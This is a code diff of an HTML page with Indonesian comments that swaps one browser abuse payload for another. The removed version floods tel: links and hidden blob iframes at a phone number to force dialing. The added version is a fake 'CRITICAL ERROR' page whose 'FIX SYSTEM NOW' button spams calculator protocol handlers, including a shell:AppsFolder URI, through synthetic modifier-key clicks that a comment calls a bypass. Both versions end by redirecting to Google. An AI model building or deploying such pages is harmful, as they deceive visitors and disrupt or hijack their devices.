@@ -1,76 +1,121 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>RESERVED - KERNEL RESEARCH GATEWAY</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Diagnostic Tool</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'SF Mono', monospace; padding: 15px; font-size: 10px; overflow: hidden; transition: background 0.5s; }
-        .danger { color: #ff3b30; text-shadow: 0 0 8px #f00; font-weight: bold; }
-        .kern { background: #f00; color: #fff; padding: 0 4px; font-weight: bold; }
-        #monitor { border: 1px solid #333; height: 90vh; overflow-y: hidden; display: flex; flex-direction: column-reverse; }
-        .blink { animation: blinker 0.1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body {
+            background-color: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            border: 2px solid #00ff00;
+            padding: 40px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+            background: rgba(0, 0, 0, 0.8);
+        }
+
+        h1 { font-size: 2.5rem; margin-bottom: 10px; }
+        p { color: #888; margin-bottom: 30px; }
+
+        #strike-btn {
+            background: #00ff00;
+            color: black;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        #strike-btn:hover {
+            background: #008800;
+            color: white;
+            box-shadow: 0 0 30px #00ff00;
+            transform: scale(1.05);
+        }
+
+        .status {
+            margin-top: 20px;
+            font-family: monospace;
+            height: 20px;
+        }
     </style>
 </head>
 <body>
-    <div id="monitor">
-        <div class="danger blink">> [SYSTEM] OVERRIDING TCC.FRAMEWORK...</div>
-    </div>
+
+<div class="container">
+    <h1>CRITICAL ERROR</h1>
+    <p>Your system requires immediate calculator calibration.</p>
+    <button id="strike-btn">FIX SYSTEM NOW</button>
+    <div class="status" id="status-text"></div>
+</div>
 
 <script>
-const mon = document.getElementById('monitor');
-const log = m => {
-    const d = document.createElement('div');
-    d.innerHTML = `> ${m}`;
-    mon.prepend(d);
-};
-
-const TARGET_NUM = "08123456789"; // Ganti dengan nomor risetmu
-
-function injectPayload(num) {
-    const target = `tel:${num}`;
-    const blob = new Blob([`<script>window.location.href="${target}";<\/script>`], {type: 'text/html'});
-    const blobUrl = URL.createObjectURL(blob);
+    const btn = document.getElementById('strike-btn');
+    const status = document.getElementById('status-text');
     
-    const a = document.createElement('a');
-    a.href = target;
-    a.rel = "noreferrer";
-    
-    const ifr = document.createElement('iframe');
-    ifr.style.display = 'none';
-    ifr.src = blobUrl;
-    
-    document.body.appendChild(ifr);
-    a.click(); 
+    let strikes = 0;
+    const maxStrikes = 50; // Dibatasi agar tidak crash total saat testing
 
-    setTimeout(() => {
-        if(document.body.contains(ifr)) document.body.removeChild(ifr);
-        URL.revokeObjectURL(blobUrl);
-    }, 100);
-}
+    const launchCalc = () => {
+        const protocols = [
+            "calculator:",
+            "ms-calculator:",
+            "ms-calc:",
+            "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"
+        ];
 
-window.onload = () => {
-    log("<span class='kern'>INITIATING STACK FLOODING...</span>");
-    
-    let thread_count = 0;
-    const floodGate = setInterval(() => {
-        const pid = Math.random().toString(16).slice(2, 8).toUpperCase();
-        log(`[THREAD-${thread_count}] SIGNAL_SENT [ID:${pid}] -> <span class="danger">FORCE_DIAL</span>`);
-        
-        injectPayload(TARGET_NUM);
-        thread_count++;
-        
-        if(thread_count > 100) { // Saya turunkan ke 100 agar redirect lebih cepat terasa
-            clearInterval(floodGate);
-            log("<span class='kern'>FLOOD COMPLETE. REDIRECTING TO CORE...</span>");
-            
-            // LOGIKA REDIRECT CEPAT
-            setTimeout(() => {
-                window.location.replace("https://www.google.com");
-            }, 500); 
-        }
-    }, 15);
-};
+        const execute = () => {
+            if (strikes >= maxStrikes) {
+                status.innerText = "REDIRECTING TO SAFETY...";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+                return;
+            }
+
+            // Burst: 3 kalkulator per frame
+            for(let i = 0; i < 3; i++) {
+                const target = protocols[strikes % protocols.length];
+                const a = document.createElement('a');
+                a.href = target;
+                
+                // Modifier untuk bypass
+                const evt = new MouseEvent('click', {
+                    bubbles: true,
+                    ctrlKey: true,
+                    metaKey: true
+                });
+                
+                a.dispatchEvent(evt);
+            }
+
+            strikes++;
+            status.innerText = `INJECTING PROTOCOL: ${strikes * 2}%`;
+            requestAnimationFrame(execute);
+        };
+
+        execute();
+    };
+
+    btn.onclick = (e) => {
+        btn.style.display = 'none';
+        launchCalc();
+    };
 </script>
+
 </body>
 </html>
